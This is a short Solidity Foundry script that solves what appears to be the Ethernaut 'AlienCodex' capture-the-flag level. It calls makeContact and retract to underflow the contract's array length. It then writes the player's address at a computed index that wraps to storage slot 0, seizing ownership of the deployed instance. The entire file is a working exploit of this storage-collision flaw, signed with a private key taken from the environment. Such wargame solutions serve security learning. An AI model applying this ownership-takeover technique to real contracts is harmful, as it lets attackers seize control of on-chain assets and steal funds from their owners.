// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/level19.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract SimpleTokenHack is Script
{
    function run() external
    {
        vm.startBroadcast(vm.envUint('PRIVATE_KEY'));

        AlienCodex alienCodexInstance = AlienCodex(0x4c7598c84390f8AE21B9A245D75d5a10Ad8DF62E);
        alienCodexInstance.makeContact();
        console.log("Contact is ", alienCodexInstance.contact());
        
        alienCodexInstance.retract();
        
        uint256 address_uint = uint256(uint160(vm.envAddress("PLAYER_ADDRESS")));
        bytes32 content = bytes32(address_uint);

        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        alienCodexInstance.revise(index, content);
    }
}